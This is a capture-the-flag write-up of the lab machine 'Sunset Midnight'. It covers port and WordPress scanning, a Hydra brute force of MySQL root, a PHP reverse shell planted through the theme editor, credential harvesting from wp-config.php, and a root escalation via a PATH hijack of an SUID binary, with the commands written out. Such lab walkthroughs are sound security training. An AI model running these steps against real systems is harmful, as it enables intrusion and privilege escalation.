---
title: "[PLAY] Proving Grounds: Sunset Midnight"
---

This is a write up for the box Sunset Midnight on proving grounds which is a Linux based box rated as intermediate.

## Enumeration: Port Scan
---
Starting off by running RustScan on the box to find out some open ports.

```
┌──(hhhharshil㉿kali)-[~/Desktop/sunsetmidnight]
└─$ rustscan -a  192.168.134.88  -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/hhhharshil/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.134.88:22
Open 192.168.134.88:80
Open 192.168.134.88:3306

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5CuyxbQ0hflsMDQe6CKt3H41UNbqR/7dqfRp2OkKxsOZ8sM0gHgGPU41j+b6ByHnkBSYi+NEIV+VXcnpGraaGhn/3mjF5uvgVdei5n2O9ZgX6Vuefk4o6Q3DL2DsEtOCaepPimfSX1TetQUjWc8f9ciax4Za5FdCjZL/L1eV211Aidf93iROG7y6GUzRyMGBGQTPUnZK39dTmJEpo+qprHmv2LCG84azdXwTGR1YilTVtrgnkMUyrq6gnuins4fxLkm5OwnznuL8nQgIWfH9I0YGuFkqf3pR1VHFeaOJnFMh9XfH58/BzlzLVtcaKYP45ARztIouRVtgHseXmW7X
|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOByIes6+atfEdAfAg4dy8LGa1TrPSa7sVSWSkEc5X+/932xaylSrtw/EvgKnGFW4zxSDNywRWtsJ6PN2iTRujQ=
|   256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILUvvXW/tfdzAPwVMpeX7n7D3ObXCvVg2fpFsKc3htfy
80/tcp   open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://sunset-midnight/
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 18
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, ODBCClient, IgnoreSpaceBeforeParenthesis, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, SupportsLoadDataLocal, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, IgnoreSigpipes, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: h_%:2./B;C!uM^tJWU&[
|_  Auth Plugin Name: mysql_native_password

```

- 22 SSH
- 80 HTTP Wordpress
- 3306 MySql 

## Enumeration: HTTP
---
The webpage over at port 80 was running wordpress so wp-scan was ran against the machine to enumerate for version numbers and bruteforce the password for the admin user which was disclosed by the login page.

<img src="/assets/resources/sunsetmidnight/suset_disclosure.png" />

```
[+] URL: http://sunset-midnight/wp-login.php/ [192.168.134.88]
[+] Started: Fri Dec 31 16:31:45 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://sunset-midnight/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite 

[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos 
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://sunset-midnight/wp-includes/css/dashicons.min.css?ver=5.4.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://sunset-midnight/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://sunset-midnight/wp-includes/js/wp-util.min.js?ver=5.4.2
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://sunset-midnight/wp-includes/css/dashicons.min.css?ver=5.4.2
 |   - http://sunset-midnight/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://sunset-midnight/wp-admin/css/forms.min.css?ver=5.4.2
 |   - http://sunset-midnight/wp-admin/css/l10n.min.css?ver=5.4.2

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simply-poll-master
 | Location: http://sunset-midnight/wp-login.php/wp-content/plugins/simply-poll-master/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.
```

## MySQL Enumeration + WordPress Foothold
---

As the MySql port is open we know that the default user used for this port is root. We can use a tool such as hydra and a wordlist like rockyou.txt to see if it is using weak credentials.

```
┌──(hhhharshil㉿kali)-[~/Desktop/sunsetmidnight]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.134.88 mysql 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-31 16:35:35
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.134.88:3306/
[3306][mysql] host: 192.168.134.88   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-31 16:35:39
```

Credentials of root:robert were found.

After logging in we listed the databases and used the wordpress_db. It appears we have the ability to set the hash for the admin user so we generated a md5hash for any string that we want to be the password. After updating the password we can now login with credentials admin:harshil

<img src="/assets/resources/sunsetmidnight/sunset_wp_pass.png" />

Now that we have access to the wordpress admin page we will insert a php reverse shell in one of the pages by going to theme editor.

I will overwrite the contents of the 404.php entry with the pentest monkey reverse shell.

<img src="/assets/resources/sunsetmidnight/sunset_404.png" />

Then a listener will be setup on port 4444. 

The reverse shell in this case 404.php will be executed by browsing to the following page: http://sunset-midnight/wp-content/themes/twentytwenty/404.php

## Priv Esc: status SUID binary
---
In the wp-config file we can see that user jose and a password is listed. 

```
www-data@midnight:/var/www/html/wordpress$ cat wp-config.php                                                                                                                                                                                
<?php                                                                                                                                                                                                                                       
/**
 * The base configuration for WordPress
 * 
 * The wp-config.php creation script uses this file during the                                 
 * installation. You don't have to use the web site, you can                                   
 * copy this file to "wp-config.php" and fill in the values.                                   
 *                                                                                                                    
 * This file contains the following configurations:                                                                   
 *                                                                                                                    
 * * MySQL settings                                                                                                   
 * * Secret keys                                                                                                      
 * * Database table prefix                                 
 * * ABSPATH
 *                                                         
 * @link https://wordpress.org/support/article/editing-wp-config-php/                                                 
 *                                 
 * @package WordPress
 */                                                                                                                   
                                                                                                                      
// ** MySQL settings - You can get this info from your web host ** //                                                 
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );                       
                                                           
/** MySQL database username */              
define( 'DB_USER', 'jose' );
                                                                                                                      
/** MySQL database password */                                                                                        
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );                                                          
```

We will su into the user jose and check its permissions we aren't able to list any of the sudo perms.

On the other hand, we are able to check for suid binaries and the /usr/bin/status binary sticks out as unsual.

```
jose@midnight:/var/www/html/wordpress$ find / -perm -u=s 2>/dev/null 
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/status
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

If we run strings on it we can see that it is calling the service binary but a PATH is not indicated.

<img src="/assets/resources/sunsetmidnight/sunset_strings.png" />

We can abuse this by doing the following:
1. creating a service binary which executes /bin/sh in a /tmp folder
2. changing the path to execute from /tmp/:$PATH
3. execute /usr/bin/status

```
jose@midnight:/var/www/html/wordpress$ cd /tmp/
jose@midnight:/tmp$ echo "/bin/sh" > service
jose@midnight:/tmp$ chmod +x service 
jose@midnight:/tmp$ export PATH=/tmp/:$PATH
jose@midnight:/tmp$ /usr/bin/status 
# whoami
root
```

## Breakdown
---
1. Hydra Bruteforce MySQl 
2. Login to MySQL change admin user creds
3. Browse to /wp-admin/ exposed in robots.txt 
4. Login as admin + password updated via MySQL
5. Theme Editor to replace a page to a php reverse shell
6. check /var/www/html/wordpress/ wp-config exposes user creds
7. su jose
8. suid binary of status exposed
9. strings status exposes service is called without a proper path
10. create service binary executes /bin/sh in /tmp
11. Add /tmp to path
12. execute /usr/bin/status
